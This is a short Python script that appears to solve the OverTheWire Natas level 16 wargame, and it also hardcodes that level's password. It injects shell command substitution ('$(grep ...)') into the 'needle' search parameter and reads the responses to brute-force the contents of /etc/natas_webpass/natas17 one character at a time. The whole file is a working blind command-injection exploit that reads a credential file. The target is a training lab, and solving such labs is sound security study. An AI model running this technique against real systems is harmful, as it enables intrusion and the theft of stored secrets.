import requests
import string

url = "http://natas16.natas.labs.overthewire.org/"
auth = ("natas16", "hPkjKYviLQctEW33QmuXL6eDVfMW4sGo")  # Replace with your real password

charset = string.ascii_letters + string.digits

found = ""
print('Start brute-forcing!!')
for i in range(1, 33):
    for ch in charset:
        payload = f'$(grep ^{found + ch} /etc/natas_webpass/natas17)'
        res = requests.get(url, params={"needle": payload + "anything"}, auth=auth)
        if "anything" not in res.text:
            found += ch
            print(f"[+] Found so far: {found}")
            break

print(f"[✅] Final password for natas17: {found}")
